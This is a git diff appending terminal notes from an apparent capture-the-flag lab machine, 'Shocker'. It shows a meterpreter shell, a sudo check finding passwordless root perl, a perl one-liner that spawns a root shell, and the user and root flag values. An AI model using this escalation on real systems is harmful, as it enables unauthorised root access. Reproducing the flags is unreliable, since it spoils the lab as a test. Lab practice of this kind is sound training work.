@@ -151,3 +151,77 @@ meterpreter > pwd
 meterpreter > cat user.txt
 269772aeb3c671e933017e412063eab9
 meterpreter > 
+
+
+
+
+
+
+
+
+
+meterpreter > shell 
+Process 2576 created.
+Channel 2 created.
+ 
+sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+
+
+
+meterpreter > shell
+Process 2594 created.
+Channel 5 created.
+id
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+sudo perl -e 'exec("/bin/bash")'
+id
+uid=0(root) gid=0(root) groups=0(root)
+ls
+user.txt
+pwd  
+/home/shelly
+cd ..
+ls
+shelly
+cd ..
+ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+cd root
+ls
+root.txt
+pwd
+/root
+ls
+root.txt
+cat root.txt
+827704ec5f851e6b2a7c3b895f1e044f
+
